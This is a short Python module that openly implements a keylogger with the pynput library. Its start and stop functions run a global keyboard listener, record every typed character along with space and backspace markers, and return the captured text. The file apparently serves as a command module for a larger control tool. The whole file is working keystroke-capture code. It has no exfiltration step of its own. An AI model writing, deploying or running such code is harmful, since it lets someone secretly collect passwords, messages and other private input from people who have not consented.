from pynput import keyboard

_listener: keyboard.Listener = None
_output: str = ''

def on_press(key):
    global _output
    try:
        # print(f'Key pressed: {key.char}')
        _output += key.char
    except AttributeError:
        pass
        # print(f'Special key pressed: {key}')

def on_release(key):
    global _output
    # print(f'Key released: {key}')
    if key == keyboard.Key.space:
        _output += " "
    if key == keyboard.Key.esc:
        return False
    if key == keyboard.Key.backspace and _output:
        _output += '<bs>'

def start_keylogger() -> str:
    global _listener
    global _output

    if _listener and _listener.running:
        return 'Keylogger already running'

    _output = ''
    _listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    _listener.start()
    return 'Started keylogger'

def stop_keylogger() -> str:
    global _listener
    if _listener and _listener.running:
        _listener.stop()
        _listener = None
        return _output
    else:
        return 'Keylogger not started'

